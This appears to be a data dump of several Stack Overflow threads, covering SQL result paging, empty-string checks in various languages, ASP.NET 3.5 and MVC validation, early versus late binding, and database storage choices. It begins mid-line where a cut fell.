   swap(Number,I,NumberOfBits-1-I);</p>
"
"How to return a page of results from SQL? <p>Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.</p>

<p>What's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?</p>

<p>Does LINQ simplify the solution?</p>
 <p>On MS SQL Server 2005 and above, <a href=""http://msdn.microsoft.com/en-us/library/ms186734.aspx"" rel=""nofollow"">ROW_NUMBER()</a> seems to work:</p>

<p><a href=""http://blogs.x2line.com/al/archive/2005/11/18/1323.aspx"" rel=""nofollow"">T-SQL: Paging with ROW_NUMBER()</a></p>

<pre><code>DECLARE @PageNum AS INT;
DECLARE @PageSize AS INT;
SET @PageNum = 2;
SET @PageSize = 10;

WITH OrdersRN AS
(
    SELECT ROW_NUMBER() OVER(ORDER BY OrderDate, OrderID) AS RowNum
          ,OrderID
          ,OrderDate
          ,CustomerID
          ,EmployeeID
      FROM dbo.Orders
)

SELECT * 
  FROM OrdersRN
 WHERE RowNum BETWEEN (@PageNum - 1) * @PageSize + 1 
                  AND @PageNum * @PageSize
 ORDER BY OrderDate
         ,OrderID;
</code></pre>
 <p>Actually, LINQ has Skip and Take methods which can be combined to choose which records are fetched.</p>

<p>Check those out.</p>

<p>For DB: <a href=""http://www.singingeels.com/Articles/Pagination_In_SQL_Server_2005.aspx"" rel=""nofollow"">Pagination In SQL Server 2005</a></p>
 <p>Oracle Solution:</p>

<pre><code>select * from (
    select a.*, rownum rnum from (
        YOUR_QUERY_GOES_HERE -- including the order by
    ) a
    where rownum &lt;= MAX_ROW
 ) where rnum &gt;= MIN_ROW
</code></pre>
 <p>I'd recommend either using LINQ, or try to copy what it does. I've got an app where I use the LINQ Take and Skip methods to retrieve paged data. The code looks something like this:</p>

<pre><code>MyDataContext db = new MyDataContext();
var results = db.Products
    .Skip((pageNumber - 1) * pageSize)
    .Take(pageSize);
</code></pre>

<p>Running SQL Server Profiler reveals that LINQ is converting this query into SQL similar to:</p>

<pre><code>SELECT [ProductId], [Name], [Cost], and so on...
FROM (
    SELECT [ProductId], [Name], [Cost], [ROW_NUMBER]
    FROM (
       SELECT ROW_NUMBER() OVER (ORDER BY [Name]) AS [ROW_NUMBER], 
           [ProductId], [Name], [Cost]
       FROM [Products]
    )
    WHERE [ROW_NUMBER] BETWEEN 10 AND 20
)
ORDER BY [ROW_NUMBER]
</code></pre>

<p>In plain English:<br />
1. Filter your rows and use the ROW_NUMBER function to add row numbers in the order you want.<br />
2. Filter (1) to return only the row numbers you want on your page.<br />
3. Sort (2) by the row number, which is the same as the order you wanted (in this case, by Name).</p>
 <p>There are a few solutions which I use with MS SQL 2005.</p>

<p>One of them is ROW<em>NUMBER(). But, personally, I don't like ROW</em>NUMBER() because it doesn't work for big results (DB which I work on is really big -- over 1TB data running thousands of queries in second -- you know -- big social networking site).</p>

<p>Here are my favourite solution.</p>

<p>I will use kind of pseudo code of T-SQL.</p>

<p>Let's find 2nd page of users sorted by forename, surname, where each page has 10 records.</p>

<pre><code>@page = 2 -- input parameter
@size = 10 -- can be optional input parameter

if @page &lt; 1 then begin
    @page = 1 -- check page number
end
@start = (@page-1) * @size + 1 -- @page starts at record no @start

-- find the beginning of page @page
SELECT TOP (@start)
    @forename = forename,
    @surname = surname
    @id = id
FROM
    users
ORDER BY
    forename,
    surname,
    id -- to keep correct order in case of have two John Smith.

-- select @size records starting from @start
SELECT TOP (@size)
    id,
    forename,
    surname
FROM
    users
WHERE
    (forename = @forename and surname = @surname and id &gt;= @id) -- the same name and surname, but bigger id
    OR (forename = @forename and surname &gt; @surname) -- the same name, but bigger surname, id doesn't matter
    OR (forename &gt; @forename) -- bigger forename, the rest doesn't matter
ORDER BY
    forename,
    surname,
    id
</code></pre>
 <p>LINQ combined with lambda expressions and anonymous classes in .Net 3.5 <em>hugely</em> simplifies this sort of thing.</p>

<p>Querying the database:</p>

<pre><code>var customers = from c in db.customers
                join p in db.purchases on c.CustomerID equals p.CustomerID
                where p.purchases &gt; 5
                select c;
</code></pre>

<p>Number of records per page:</p>

<pre><code>customers = customers.Skip(pageNum * pageSize).Take(pageSize);
</code></pre>

<p>Sorting by any column:</p>

<pre><code>customers = customers.OrderBy(c =&gt; c.LastName);
</code></pre>

<p>Getting only selected fields from server:</p>

<pre><code>var customers = from c in db.customers
                join p in db.purchases on c.CustomerID equals p.CustomerID
                where p.purchases &gt; 5
                select new
                {
                    CustomerID = c.CustomerID,
                    FirstName = c.FirstName,
                    LastName = c.LastName
                };
</code></pre>

<p>This creates a statically-typed anonymous class in which you can access its properties:</p>

<pre><code>var firstCustomer = customer.First();
int id = firstCustomer.CustomerID;
</code></pre>

<p>Results from queries are lazy-loaded by default, so you aren't talking to the database until you actually need the data. LINQ in .Net also greatly simplifies updates by keeping a datacontext of any changes you have made, and only updating the fields which you change.</p>
 <p>There is a discussion about this <a href=""http://www.4guysfromrolla.com/webtech/042606-1.shtml"" rel=""nofollow"">Here</a></p>

<p>The technique gets page number 100,000 from a 150,000 line database in 78ms</p>

<blockquote>
  <p>Using optimizer knowledge and SET ROWCOUNT, the first EmployeeID in the page that is requested is stored in a local variable for a starting point. Next, SET ROWCOUNT to the maximum number of records that is requested in @maximumRows. This allows paging the result set in a much more efficient manner. Using this method also takes advantage of pre-existing indexes on the table as it goes directly to the base table and not to a locally created table. </p>
</blockquote>

<p>I am afraid I am not able to judge if it is better than the current accepted answer.</p>
 <p>There are essentially two ways of doing pagination in the database (I'm assuming you're using SQL Server):</p>

<h3>Using OFFSET</h3>

<p>Others have explained how the <code>ROW_NUMBER() OVER()</code> ranking function can be used to perform pages. It's worth mentioning that SQL Server 2012 finally included support for the SQL standard <a href=""http://technet.microsoft.com/en-us/library/gg699618.aspx"" rel=""nofollow""><code>OFFSET .. FETCH</code></a> clause:</p>

<pre><code>SELECT first_name, last_name, score
FROM players
ORDER BY score DESC
OFFSET 40 ROWS FETCH NEXT 10 ROWS ONLY
</code></pre>

<p>If you're using SQL Server 2012 and backwards-compatibility is not an issue, you should probably prefer this clause as it will be executed more optimally by SQL Server in corner cases.</p>

<h3>Using the SEEK Method</h3>

<p>There is an entirely different, much faster, but less known way to perform paging in SQL. This is often called the ""seek method"" as described in <a href=""http://blog.jooq.org/2013/10/26/faster-sql-paging-with-jooq-using-the-seek-method/"" rel=""nofollow"">this blog post here</a>.</p>

<pre><code>SELECT TOP 10 first_name, last_name, score
FROM players
WHERE (score &lt; @previousScore)
   OR (score = @previousScore AND player_id &lt; @previousPlayerId)
ORDER BY score DESC, player_id DESC
</code></pre>

<p>The <code>@previousScore</code> and <code>@previousPlayerId</code> values are the respective values of the last record from the previous page. This allows you to fetch the ""next"" page. If the <code>ORDER BY</code> direction is <code>ASC</code>, simply use <code>&gt;</code> instead.</p>

<p>With the above method, you cannot immediately jump to page 4 without having first fetched the previous 40 records. But often, you do not want to jump that far anyway. Instead, you get a much faster query that might be able to fetch data in constant time, depending on your indexing. Plus, your pages remain ""stable"", no matter if the underlying data changes (e.g. on page 1, while you're on page 4).</p>

<p>This is the best way to implement paging when lazy loading more data in web applications, for instance.</p>

<p>Note, the ""seek method"" is also called <a href=""http://stackoverflow.com/a/3215973/521799"">keyset paging</a>.</p>
"
"Checking for string contents? string Length Vs Empty String <p>Which is more efficient for the compiler and the best practice for checking whether a string is blank? </p>

<ol>
<li>Checking whether the length of the string == 0</li>
<li>Checking whether the string is empty (strVar == """")</li>
</ol>

<p>Also, does the answer depend on language?</p>
 <p>Yes, it depends on language, since string storage differs between languages.</p>

<ul>
<li>Pascal-type strings: <code>Length = 0</code>.</li>
<li>C-style strings: <code>[0] == 0</code>. </li>
<li>.NET: <code>.IsNullOrEmpty</code>.</li>
</ul>

<p>Etc. </p>
 <p>In .Net:</p>

<pre><code>string.IsNullOrEmpty( nystr );
</code></pre>

<p>strings can be null, so .Length sometimes throws a NullReferenceException</p>
 <p>Actually, IMO the best way to determine is the IsNullOrEmpty() method of the string class.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.string.isnullorempty."" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/system.string.isnullorempty.</a></p>

<p>Update: I assumed .Net, in other languages, this might be different.</p>
 <p>In languages that use C-style (null-terminated) strings, comparing to <code>""""</code> will be faster.  That's an O(1) operation, while taking the length of a C-style string is O(n).</p>

<p>In languages that store length as part of the string object (C#, Java, ...) checking the length is also O(1).  In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string.</p>
 <p>In Java 1.6, the String class has a new method <a href=""http://java.sun.com/javase/6/docs/api/java/lang/String.html#isEmpty()"" rel=""nofollow"" title=""I/O management and disk scheduling"">isEmpty</a> </p>

<p>There is also the Jakarta commons library, which has the <a href=""http://commons.apache.org/lang/api/org/apache/commons/lang/StringUtils.html#isBlank()"" rel=""nofollow"" title=""Inside Windows Vista Kernel"">isBlank</a> method. Blank is defined as a string that contains only whitespace.</p>
 <blockquote>
  <p>In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string.</p>
</blockquote>

<p>@DerekPark: That's not always true. """" is a string literal so, in Java, it will almost certainly already be interned.</p>
 <p>For C strings,</p>

<pre><code>if (s[0] == 0)
</code></pre>

<p>will be faster than either</p>

<pre><code>if (strlen(s) == 0)
</code></pre>

<p>or</p>

<pre><code>if (strcmp(s, """") == 0)
</code></pre>

<p>because you will avoid the overhead of a function call.</p>
 <blockquote>
  <p>In languages that use C-style (null-terminated) strings, comparing to """" will be faster</p>
</blockquote>

<p>Actually, it may be better to check if the first char in the string is '\0':</p>

<pre><code>char *mystring;
/* do something with the string */
if ((mystring != NULL) &amp;&amp; (mystring[0] == '\0')) {
    /* the string is empty */
}
</code></pre>

<p>In Perl there's a third option, that the string is undefined.  This is a bit different from a NULL pointer in C, if only because you don't get a segmentation fault for accessing an undefined string. </p>
 <p>@Nathan</p>

<blockquote>
  <p>Actually, it may be better to check if the first char in the string is '\0':</p>
</blockquote>

<p>I almost mentioned that, but ended up leaving it out, since calling <code>strcmp()</code> with the empty string and directly checking the first character in the string are both O(1).  You basically just pay for an extra function call, which is pretty cheap.  If you <em>really</em> need the absolute best speed, though, definitely go with a direct first-char-to-0 comparison.</p>

<p>Honestly, I always use <code>strlen() == 0</code>, because I have <em>never</em> written a program where this was actually a measurable performance issue, and I think that's the most readable way to express the check.</p>
 <p><code>String.IsNullOrEmpty()</code> only works on .net 2.0 and above, for .net 1/1.1, I tend to use:</p>

<pre><code>if (inputString == null || inputString == String.Empty)
{
    // String is null or empty, do something clever here. Or just expload.
}
</code></pre>

<p>I use String.Empty as opposed to """" because """" will create an object, whereas String.Empty wont - I know its something small and trivial, but id still rather not create objects when I dont need them! (<a href=""http://blogs.msdn.com/brada/archive/2003/04/22/49997.aspx"" rel=""nofollow"">Source</a>)</p>
 <p>Again, without knowing the language, it's impossible to tell.</p>

<p>However, I recommend that you choose the technique that makes the most sense to the maintenance programmer that follows and will have to maintain your work.</p>

<p>I'd recommend writing a function that explicitly does what you want, such as</p>

<pre><code>#define IS_EMPTY(s) ((s)[0]==0)
</code></pre>

<p>or comparable.  Now there's no doubt at is you're checking.</p>
 <p>Assuming your question is .NET:</p>

<p>If you want to validate your string against nullity as well use IsNullOrEmpty, if you know already that your string is not null, for example when checking TextBox.Text etc., do not use IsNullOrEmpty, and then comes in your question.<br>
So for my opinion String.Length is less perfomance than string comparison.</p>

<p>I event tested it (I also tested with C#, same result):</p>

<pre><code>Module Module1
  Sub Main()
    Dim myString = """"


    Dim a, b, c, d As Long

    Console.WriteLine(""Way 1..."")

    a = Now.Ticks
    For index = 0 To 10000000
      Dim isEmpty = myString = """"
    Next
    b = Now.Ticks

    Console.WriteLine(""Way 2..."")

    c = Now.Ticks
    For index = 0 To 10000000
      Dim isEmpty = myString.Length = 0
    Next
    d = Now.Ticks

    Dim way1 = b - a, way2 = d - c

    Console.WriteLine(""way 1 took {0} ticks"", way1)
    Console.WriteLine(""way 2 took {0} ticks"", way2)
    Console.WriteLine(""way 1 took {0} ticks more than way 2"", way1 - way2)
    Console.Read()
  End Sub
End Module
</code></pre>

<p>Result:</p>

<pre><code>Way 1...
Way 2...
way 1 took 624001 ticks
way 2 took 468001 ticks
way 1 took 156000 ticks more than way 2
</code></pre>

<p>Which means comparison takes way more than string length check.</p>
 <p>After I read this thread, I conducted a little experiment, which yielded two distinct, and interesting, findings.</p>

<p>Consider the following.</p>

<pre><code>strInstallString    ""1"" string
</code></pre>

<p>The above is copied from the locals window of the Visual Studio debugger. The same value is used in all three of the following examples.</p>

<p><strong>if ( strInstallString == """" ) === if ( strInstallString == string.Empty )</strong></p>

<p>Following is the code displayed in the disassembly window of the Visual Studio 2013 debugger for these two fundamentally identical cases.</p>

<pre><code>if ( strInstallString == """" )
003126FB  mov         edx,dword ptr ds:[31B2184h]
00312701  mov         ecx,dword ptr [ebp-50h]
00312704  call        59DEC0B0            ; On return, EAX = 0x00000000.
00312709  mov         dword ptr [ebp-9Ch],eax
0031270F  cmp         dword ptr [ebp-9Ch],0
00312716  sete        al
00312719  movzx       eax,al
0031271C  mov         dword ptr [ebp-64h],eax
0031271F  cmp         dword ptr [ebp-64h],0
00312723  jne         00312750

if ( strInstallString == string.Empty )
00452443  mov         edx,dword ptr ds:[3282184h]
00452449  mov         ecx,dword ptr [ebp-50h]
0045244C  call        59DEC0B0        ; On return, EAX = 0x00000000.
00452451  mov         dword ptr [ebp-9Ch],eax
00452457  cmp         dword ptr [ebp-9Ch],0
0045245E  sete        al
00452461  movzx       eax,al
00452464  mov         dword ptr [ebp-64h],eax
00452467  cmp         dword ptr [ebp-64h],0
0045246B  jne         00452498
</code></pre>

<p><strong>if ( strInstallString == string.Empty ) Isn't Significantly Different</strong></p>

<pre><code>if ( strInstallString.Length == 0 )
003E284B  mov         ecx,dword ptr [ebp-50h]
003E284E  cmp         dword ptr [ecx],ecx
003E2850  call        5ACBC87E        ; On return, EAX = 0x00000001.
003E2855  mov         dword ptr [ebp-9Ch],eax
003E285B  cmp         dword ptr [ebp-9Ch],0
003E2862  setne       al
003E2865  movzx       eax,al
003E2868  mov         dword ptr [ebp-64h],eax
003E286B  cmp         dword ptr [ebp-64h],0
003E286F  jne         003E289C
</code></pre>

<p>From the above machine code listings, generated by the NGEN module of the .NET Framework, version 4.5, I draw the following conclusions.</p>

<ol>
<li><p>Testing for equality against the empty string literal and the static string.Empty property on the System.string class are, for all practical purposes, identical. The only difference between the two code snippets is the source of the first move instruction, and both are offsets relative to ds, implying that both refer to baked-in constants.</p></li>
<li><p>Testing for equality against the empty string, as either a literal or the string.Empty property, sets up a two-argument function call, which indicates <em>inequality</em> by returning zero. I base this conclusion on other tests that I performed a couple of months ago, in which I followed some of my own code across the managed/unmanaged divide and back. In all cases, any call that required two or more arguments put the first argument in register ECX, and and the second in register EDX. I don't recall how subsequent arguments were passed. Nevertheless, the call setup looked more like __fastcall than __stdcall. Likewise, the expected return values always showed up in register EAX, which is almost universal.</p></li>
<li><p>Testing the length of the string sets up a one-argument function call, which returns 1 (in register EAX), which happens to be the length of the string being tested.</p></li>
<li><p>Given that the immediately visible machine code is almost identical, the only reason that I can imagine that would account for the better performance of the string equality over the sting length reported by <strong>Shinny</strong> is that the two-argument function that performs the comparison is significantly better optimized than the one-argument function that reads the length off the string instance.</p></li>
</ol>

<p><strong>Conclusion</strong></p>

<p>As a matter of principle, I avoid comparing against the empty string as a literal, because the empty string literal can appear ambiguous in source code. To that end, my .NET helper classes have long defined the empty string as a constant. Though I use <strong>string.Empty</strong> for direct, inline comparisons, the constant earns its keep for defining other constants whose value is the empty string, because a constant cannot be assigned <strong>string.Empty</strong> as its value.</p>

<p>This exercise settles, once and for all, any concern I might have about the cost, if any, of comparing against either <strong>string.Empty</strong> or the constant defined by my helper classes.</p>

<p>However, it also raises a puzzling question to replace it; why is comparing against <strong>string.Empty</strong> more efficient than testing the length of the string? Or is the test used by Shinny invalidated because by the way the loop is implemented? (I find that hard to believe, but, then again, I've been fooled before, as I'm sure you have, too!)</p>

<p>I have long assumed that <strong>system.string</strong> objects were counted strings, fundamentally similar to the long established Basic String (BSTR) that we have long known from COM.</p>
"
"What are the useful new ASP.NET features in the .NET Framework 3.5? <p>I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?</p>
 <p>I'm still learning ASP.net so I can't tell you exactly, but if you look through <a href=""http://www.asp.net/learn/"" rel=""nofollow"" title=""I/O management and disk scheduling""><a href=""http://www.asp.net/learn/"" rel=""nofollow"">http://www.asp.net/learn/</a></a> you'll probably find a few new gems, there's even a 3.5 section.</p>
 <p>Check out the <a href=""http://weblogs.asp.net/scottgu/archive/2007/10/14/asp-net-mvc-framework.aspx"" rel=""nofollow"" title=""I/O management and disk scheduling"">MVC framework</a> which is built ontop of 3.5.  Big improvement over the traditional webforms model.</p>
 <p>Its the <a href=""http://www.asp.net/mvc/"" rel=""nofollow"" title=""I/O management and disk scheduling"">MVC framework</a>.  Without 3.5, there is no MVC.  Without MVC, ASP.NET is a PITA.</p>
 <p>I don't think the MVC Framework is quite ready for prime time yet, though I definitely plan to use it sometime next year.  I love the clean URLs, clean XHTML (web forms can really spew out some nasty HTML) and the ability to create controller actions with no associated view.</p>

<p>I've been using Master Pages since they were released and they've been a big help.  I do really dislike the way the master pages add the nasty prefixes to the control IDs.  It makes for some ugly CSS.  I think the MVC Framework may eliminate this problem though.</p>

<p>Any other killer features?</p>
 <p>ListView and its friend DataPager are probably worth looking at, but they're hardly ""Killer"" features.</p>

<p>Things outside of ASP.NET specifically (LINQ, for example) are probably more likely to be get the ""Killer"" commendation.</p>
 <blockquote>
  <p>Master Pages</p>
  
  <p>(of course, these are in there from
  version 2.0)</p>
</blockquote>

<p><strong>Nested</strong> master pages are new in 3.5.  I haven't used them yet, but I can only imagine they could turn into a hidious nightmare if not used very carefully.</p>

<p>You only have to <a href=""http://msdn.microsoft.com/en-us/library/dct97kc3.aspx"" rel=""nofollow"" title=""Compiler Construction (PDF)"">look at the order in which the events are fired</a> in a page that uses a master page to think 'urgh'.</p>
 <p>The split design/code view is pretty cool.  It's not perfect yet, but it's pretty cool.  Also editing in the design view now edits your css there and then.</p>
 <blockquote>
  <p>I don't think the MVC Framework is quite ready for prime time yet</p>
</blockquote>

<p>Just an FYI, this site is built in MVC.
I also have 2 apps in production on mvc, I would argue that its definitely ready for prime time.</p>
 <p>@IainMH  Nested Master Pages were always supported by ASP.NET, just not by the designer.</p>
 <p>As others have said, there's a good list at <a href=""http://www.asp.net/learn/3.5-videos/"" rel=""nofollow"" title=""pgpool-II"">www.asp.net/learn</a>. I think the biggest ASP.NET specific changes are:</p>

<ul>
<li>Official ASP.NET AJAX integration</li>
<li>ListView (much better than the GridView / DataView in that they let you write out clean HTML)</li>
<li>Big improvements to the IDE for CSS / HTML editing</li>
<li>Javascript debugging</li>
</ul>

<p>Note that ASP.NET MVC is not released yet, and was definitely not included with ASP.NET 3.5.</p>
 <p>For ASP.NET, you have a lot of improvements:</p>

<ul>
<li>split view (code and design)</li>
<li>faster switching between code and design view</li>
<li>embedded master pages (one master page in another)</li>
<li>javascript debugging</li>
</ul>

<p>Anyway most of the useful stuff are really in the meat of the language, and for .NET 3.5 the new language features for C# 3.0 will be (and yes, I find ALL of them useful)</p>

<ul>
<li>anonymous objects</li>
<li>automatic properties</li>
<li>object initializers</li>
<li>collection initializers (inline initialization for collections)</li>
<li>implicit typing (var keyword)</li>
<li>lambda expressions</li>
<li>LINQ</li>
<li>Extension methods</li>
</ul>

<p>I might have forgotten a few, but I think this is about most of the new cool <em>and</em> useful stuff.</p>
 <p>Here's a brief list of my favourites:</p>

<ul>
<li>LINQ</li>
<li>Extension Methods</li>
<li>Lambda Methods</li>
</ul>

<p>And I don't actually use ASP.NET, but ASP.NET AJAX is now included in 3.5 too and ASP.NET MVC is included in 3.5 SP1.</p>
 <p>see Scott Hanselman's post here: <a href=""http://www.hanselman.com/blog/HiddenGemsNotTheSameOld35SP1Post.aspx"" rel=""nofollow"" title=""excanvas""><a href=""http://www.hanselman.com/blog/HiddenGemsNotTheSameOld35SP1Post.aspx"" rel=""nofollow"">http://www.hanselman.com/blog/HiddenGemsNotTheSameOld35SP1Post.aspx</a></a></p>
 <p>also Dynamic Data have to be consider</p>
"
"Validating posted form data in the ASP.NET MVC framework <p>I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).</p>
 <p>Have you taken a look at this?
<a href=""http://www.codeplex.com/MvcValidatorToolkit"" rel=""nofollow"">http://www.codeplex.com/MvcValidatorToolkit</a></p>

<p>Quoted from the page</p>

<blockquote>
  <p>The Validator Toolkit provides a set
  of validators for the new ASP.NET MVC
  framework to validate HTML forms on
  the client and server-side using
  validation sets.</p>
</blockquote>

<p>I'm afraid that someone more MVC-savvy than me would have to speak to where in the architecture you should put things.</p>
 <p>I'm just learning the MVC framework too so I'm not sure how off this is, but from what I understand you would have a form on a View such as Edit.aspx.  This form would then post to the controller to another action method such as Update() passing in the contents of the form that you set in Edit.aspx as parameters.</p>

<pre><code>Update(int id, string name, string foo)
</code></pre>

<p>You could do the validation within that method.  If all is ok, </p>

<pre><code>return View(""Item"", yourObject)
</code></pre>
 <p>Here's an overview of the flow in MVC:</p>

<ol>
<li>/new - render your ""New"" view containing a form for the user to fill out</li>
<li>User fills out form and it is posted to /create</li>
<li>The post is routed to the Create action on your controller</li>
<li>In your action method, update the model with the data that was posted.</li>
<li>Your Model should validate itself.</li>
<li>Your Controller should read if the model is valid.</li>
<li>If the Model is valid, save it to your db.  Redirect to /show to render the show View for your object.</li>
<li>If the Model is invalid, save the form values and error messages in the TempData, and redirect to the New action again.  Fill your form fields with the data from TempData and show the error message(s).</li>
</ol>

<p>The validation frameworks will help you along in this process.  Also, I think the ASP.NET MVC team is planning a validation framework for the next preview.</p>
 <p>There is <a href=""http://209.85.135.104/search?q=cache:EzaP2dgUM9cJ:hammett.castleproject.org/%3Fp%3D114+Castle.Components.Validator&amp;hl=ru&amp;ct=clnk&amp;cd=2&amp;gl=ru&amp;client=firefox-a"" rel=""nofollow"">Castle.Components.Validator</a> module in Castle project. It's very agile and powerfull. It generates validation rules based on model attributes (or any other source) and even able to generate JS validation using jQuery, Prototype Validation, fValidate and other.
Of course it's wise to abstract validator away behind IValidationEngine interface. </p>
 <p>You might want to take a look at ScottGu's latest post for ASP.Net prev 5. It walks through a validation sample that is very interesting:</p>

<p><a href=""http://weblogs.asp.net/scottgu/archive/2008/09/02/asp-net-mvc-preview-5-and-form-posting-scenarios.aspx"" rel=""nofollow"">http://weblogs.asp.net/scottgu/archive/2008/09/02/asp-net-mvc-preview-5-and-form-posting-scenarios.aspx</a></p>
 <p>As far as I can tell everyone is still trying to figure out the ""standard"" way of doing it.  That said definitely check out Phil Haack and Scott Guthrie's latest posts on MVC and you'll find some interesting info on how they did.  When I was just playing around with it for myself I created a ModelBinder for the LinqToSql data class that I had generated.  You can check out this post to find out how to put together a basic ModelBinder:</p>

<p><a href=""http://blog.maartenballiauw.be/post/2008/08/29/Using-the-ASPNET-MVC-ModelBinder-attribute.aspx"" rel=""nofollow"">ASP.Net MVC Model Binder</a></p>

<p>The in your action if you had created a ""Product"" ModelBinder you would just declare the action like so:</p>

<p>public ActionResult New(Product prod)</p>

<p>And the model binder will take care of assigning posted data to the objects properties as long as you've built it right anyway.</p>

<p>After that within your GetValue() method you can implement whatever validation you want, whether using exception's, regex's, or whatever you can make a call like:</p>

<p>(ModelStateDictionary_name).AddModelError(""form_element_id"", ""entered_value"", ""error_message"");</p>

<p>Then you can just throw a &lt;%= Html.ValidationSummary() %> in your view to display all your errors.</p>

<p>For client-side validation I just used jQuery.  After you get a basic sample set up though you can start doing some interesting things combining all that with Partial Views and Ajax calls.</p>
"
"What is the difference between Early and Late Binding? <p>What is the difference between early and late binding?</p>
 <p>Taken directly from <a href=""http://word.mvps.org/fAQs/InterDev/EarlyvsLateBinding.htm"" rel=""nofollow"">http://word.mvps.org/fAQs/InterDev/EarlyvsLateBinding.htm</a></p>

<blockquote>
  <p>There are two ways to use Automation (or OLE Automation) to
  programmatically control another application.</p>
  
  <p>Late binding uses CreateObject to create and instance of the
  application object, which you can then control. For example, to create
  a new instance of Excel using late binding:</p>

<pre><code> Dim oXL As Object
 Set oXL = CreateObject(""Excel.Application"")
</code></pre>
  
  <p>On the other hand, to manipulate an existing instance of Excel (if
  Excel is already open) you would use GetObject (regardless whether
  you're using early or late binding):</p>

<pre><code> Dim oXL As Object
 Set oXL = GetObject(, ""Excel.Application"")
</code></pre>
  
  <p>To use early binding, you first need to set a reference in your
  project to the application you want to manipulate. In the VB Editor of
  any Office application, or in VB itself, you do this by selecting
  Tools + References, and selecting the application you want from the
  list (e.g. “Microsoft Excel 8.0 Object Library”).</p>
  
  <p>To create a new instance of Excel using early binding:</p>

<pre><code> Dim oXL As Excel.Application
 Set oXL = New Excel.Application
</code></pre>
  
  <p>In either case, incidentally, you can first try to get an existing
  instance of Excel, and if that returns an error, you can create a new
  instance in your error handler.</p>
</blockquote>
 <p>In compiled languages, the difference is stark.</p>

<p>Java:</p>

<pre><code>//early binding:
public create_a_foo(*args) {
 return new Foo(args)
}
my_foo = create_a_foo();

//late binding:
public create_something(Class klass, *args) {
  klass.new_instance(args)
}
my_foo = create_something(Foo);
</code></pre>

<p>In the first example, the compiler can do all sorts of neat stuff at compile time.  In the second, you just have to hope that whoever uses the method does so responsibly.  (Of course, newer JVMs support the <code>Class&lt;? extends Foo&gt; klass</code> structure, which can greatly reduce this risk.)</p>

<p>Another benefit is that IDEs can hotlink to the class definition, since it's declared right there in the method.  The call to create<em>something(Foo) might be _very</em> far from the method definition, and if you're looking at the method definition, it might be nice to see the implementation.</p>

<p>The major advantage of late binding is that it makes things like inversion-of-control easier, as well as certain other uses of polymorphism and duck-typing (if your language supports such things).</p>
 <p>In interpreted languages, the difference is a little more subtle.</p>

<p>Ruby:</p>

<pre><code># early binding:
def create_a_foo(*args)
  Foo.new(*args)
end
my_foo = create_a_foo

# late binding:
def create_something(klass, *args)
  klass.new(*args)
end
my_foo = create_something(Foo)
</code></pre>

<p>Because Ruby is (generally) not compiled, there isn't a compiler to do the nifty up-front stuff.  The growth of JRuby means that more Ruby is compiled these days, though, making it act more like Java, above.</p>

<p>The issue with IDEs still stands: a platform like Eclipse can look up class definitions if you hard-code them, but cannot if you leave them up to the caller.</p>

<p>Inversion-of-control is not terribly popular in Ruby, probably because of its extreme runtime flexibility, but Rails makes great use of late binding to reduce the amount of configuration necessary to get your application going.</p>
 <p>The short answer is that early (or static) binding refers to compile time binding and late (or dynamic) binding refers to runtime binding (for example when you use reflection).</p>
 <p>Late binding, or dynamic binding, is a computer programming mechanism in which the method being called upon an object is looked up by name at runtime.</p>

<p>With early binding, or static binding, the compilation phase fixes all types of variables and expressions. This is usually stored in the compiled program as an offset in a virtual method table (""v-table"") and is very efficient. With late binding the compiler does not have enough information to verify the method even exists, let alone bind to its particular slot on the v-table. Instead the method is looked up by name at runtime.</p>
 <p>Similar but more detailed answer from Herbert Schildt C++ book:-</p>

<p>Early binding refers to events that occur at compile time. In essence, early binding occurs when all information needed to call a function is known at compile time. (Put differently, early binding means that an object and a function call are bound during compilation.) Examples of early binding include normal function calls (including standard library functions), overloaded function calls, and overloaded operators. The main advantage to early binding is efficiency. Because all information necessary to call a function is determined at compile time, these types of function calls are very fast.</p>

<p>The opposite of early binding is late binding. Late binding refers
to function calls that are not resolved until run time. Virtual functions are used to achieve late binding. As you know, when access is via a base pointer or reference, the virtual function actually called is determined by the type of object pointed to by the pointer. Because in most cases this cannot be determined at compile time, the object and the function are not linked until run time. The main advantage to late binding is flexibility. Unlike early binding, late binding allows you to create programs that can respond to events occurring while the program executes without having to create a
large amount of ""contingency code."" Keep in mind that because a function call is not resolved until run time, late binding can make for somewhat slower execution times.
However today, fast computers have significantly reduced the execution times related to late binding.</p>
 <pre><code>public class child()
{    public void method1()
     {     System.out.println(""child1"");
     }
    public void method2()
     {     System.out.println(""child2"");
     }

}
public class teenager extends child()
{    public void method3()
     {      System.out.println(""teenager3"");
     }
}
public class adult extends teenager()
{     
    public void method1()
    {    System.out.println(""adult1);
         super.method1();
     }
}


//In java
public static void main(String []args)
{    ((teenager)var).method1();
}
</code></pre>

<p>This will print out</p>

<pre><code>adult1
child1
</code></pre>

<p>In early binding the compiler will have access to all of the methods 
in child and teenager
but in late binding (at runtime), it will check for methods that are overridden
at runtime.</p>

<p>Hence method1(from child -- early binding) will be overridden by the method1 from adult at runtime(late binding)
Then it will implement method1 from child since there is no method1 in method1 in teenager.</p>

<p>Note that if child did not have a method1 then the code in the main would not compile.</p>
"
"What's the best database storage device? <p>So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.</p>

<p>Here are some of the options:</p>

<ul>
<li>JBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable</li>
<li>NAS - Slow but cheap and expandable, probably best for backups</li>
<li>DAS - A decent compromise, but generally accessible from only one or two machines</li>
<li>SAN - Expensive but very good</li>
</ul>

<p>How much should you worry about choosing a 15k drive over a 10k or 7200RPM?</p>

<p>What's your favorite RAID level?</p>
